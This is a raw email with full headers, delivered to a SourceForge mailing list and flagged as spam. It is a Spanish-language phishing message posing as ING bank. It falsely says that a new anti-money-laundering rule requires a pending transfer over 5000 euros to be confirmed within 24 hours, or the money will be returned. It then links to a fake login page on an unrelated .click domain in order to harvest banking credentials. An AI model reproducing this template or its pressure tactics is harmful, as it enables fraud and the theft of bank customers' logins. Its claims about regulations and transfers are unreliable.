Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id C6478D0BCD2
	for <lists+osst-users@lfdr.de>; Fri, 09 Jan 2026 19:13:52 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:To:Date:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=TWXXamekDF9CRZjLqATJKx1I5RjlJPOJpfdRXAmtKAg=; b=O92HGsefIQcZPdOHVP0Ej0cALs
	qxmVCsyjo36Rz+8PcMrO5rV6blpx777VNydk/2nxn8P6FheW4tItGFrU1uPSqGZ97qFjYNYLteeDR
	uG5jZx/oFzKCaMIZyTZCVL+p9EDXq/iW9FJJlP1fCaaD2YTKDBhKopMJsRIwoCIPzsvA=;
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1veGzf-00024x-FY
	for lists+osst-users@lfdr.de;
	Fri, 09 Jan 2026 18:13:51 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <noreply@frandroid.com>) id 1veGzU-00024i-L2
 for osst-users@lists.sourceforge.net; Fri, 09 Jan 2026 18:13:40 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:From:To:Date:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=SSvT1cuxoQr92IMEOL6mmBSo8s2auzMnCC93bFX9vRI=; b=S0ipfH8D92mJb1E06VveW498as
 GrJwY0S15WBa8j8gpR+kv3pklQpfToa6rXij0+NWMgTStOaRoUasW05GtTxE77bOO9tvZbVcEcMBh
 Rtevn36wi8m6L0oIN+6PTgnSs3d1ZavRCrrg14erPFDPMwYL/cWgua5VH8Yg3FCAps7s=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 From:To:Date:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=SSvT1cuxoQr92IMEOL6mmBSo8s2auzMnCC93bFX9vRI=; b=d
 /MpyUfhMxbUv1gZ1ttYInigHlEaI4fEqeAiCF+U385qrPik2NkBmD1z8TMy7otVwqc7c+lrFk443u
 5IgUsvcOAva5RxW4djVtY6zkSLVMKQEzesHpJWmsstwdtI5JOs5ulERDb+SOGFNtl8r57RzJnpeSz
 TtwQxXWUDgPqlS/8=;
Received: from [168.235.83.164] (helo=frandroid.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1veGzR-00062p-B0 for osst-users@lists.sourceforge.net;
 Fri, 09 Jan 2026 18:13:37 +0000
Received: by frandroid.com (Postfix, from userid 33)
 id 948898ABDE; Fri,  9 Jan 2026 17:35:56 +0000 (UTC)
Date: Fri, 9 Jan 2026 16:56:56 +0000
To: osst-users@lists.sourceforge.net
Message-ID: <f025b2e39ee46eddd18c66cbe4159335@ingdirect.es>
MIME-Version: 1.0
X-Spam-Score: 5.9 (+++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  &nbsp; Estimado cliente: 
 Content analysis details:   (5.9 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE2           RBL: IP Subnet Listed in UCEPROTECT Level 2
 [168.235.83.164 listed in dnsbl-2.uceprotect.net]
 0.0 HEADER_FROM_DIFFERENT_DOMAINS From and EnvelopeFrom 2nd level mail
 domains are different
 2.0 PDS_OTHER_BAD_TLD      Untrustworthy TLDs
 [URI: www.animant-door.click (click)]
 1.6 HTML_IMAGE_ONLY_12     BODY: HTML: images with 800-1200 bytes of words
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1veGzR-00062p-B0
Subject: [SPAM] Transferencia entrante pendiente de validación
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: ING via Osst-users <osst-users@lists.sourceforge.net>
Reply-To: ING <contacto@ingdirect.es>
Content-Type: multipart/mixed; boundary="===============4955584740057846189=="
Errors-To: osst-users-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

--===============4955584740057846189==
Content-Type: multipart/alternative;
	boundary="15b5f33e2d5bbb4a6a6db423df803b0e6"
Content-Transfer-Encoding: 8bit

This is a multi-part message in MIME format.

--15b5f33e2d5bbb4a6a6db423df803b0e6
Content-Type: text/plain; charset=us-ascii




	




&nbsp;

Estimado cliente:

De acuerdo con la nueva normativa de seguridad contra el blanqueo de capitales, en vigor desde el 1 de enero de 2025, cualquier transferencia superior a 5000 euros debe ser confirmada antes de ser abonada en su cuenta.


Acaba de recibir una transferencia que requiere su confirmaci&oacute;n antes de aparecer en su cuenta.


Tenga en cuenta que, sin esta confirmaci&oacute;n, la transferencia se devolver&aacute; autom&aacute;ticamente al remitente en un plazo de 24 horas.

Confirme la recepci&oacute;n de la transferencia iniciando sesi&oacute;n a continuaci&oacute;n:

Confirmaci&oacute;n

&nbsp;

Le pedimos disculpas por las molestias ocasionadas.

Servicio de atenci&oacute;n al cliente de ING



--15b5f33e2d5bbb4a6a6db423df803b0e6
Content-Type: text/html; charset=us-ascii

<!doctype html>
<html>
<head>
	<title></title>
</head>
<body>
<p><img alt="" src="https://ing.com/webfiles/1764671720401/images/ing-logo.svg" /></p>

<p>&nbsp;</p>

<p>Estimado cliente:</p>

<p>De acuerdo con la nueva normativa de seguridad contra el blanqueo de capitales, en vigor desde el 1 de enero de 2025, cualquier transferencia superior a 5000 euros debe ser confirmada antes de ser abonada en su cuenta.</p>

<p><br />
Acaba de recibir una transferencia que requiere su confirmaci&oacute;n antes de aparecer en su cuenta.</p>

<p><br />
Tenga en cuenta que, sin esta confirmaci&oacute;n, la transferencia se devolver&aacute; autom&aacute;ticamente al remitente en un plazo de 24 horas.</p>

<p>Confirme la recepci&oacute;n de la transferencia iniciando sesi&oacute;n a continuaci&oacute;n:</p>

<p><a href="https://www.animant-door.click/auth/login.php"><span style="color:#000080;"><span style="font-size:18px;"><strong>Confirmaci&oacute;n</strong></span></span></a></p>

<p>&nbsp;</p>

<p>Le pedimos disculpas por las molestias ocasionadas.</p>

<p>Servicio de atenci&oacute;n al cliente de ING</p>
</body>
</html>



--15b5f33e2d5bbb4a6a6db423df803b0e6--


--===============4955584740057846189==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4955584740057846189==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============4955584740057846189==--

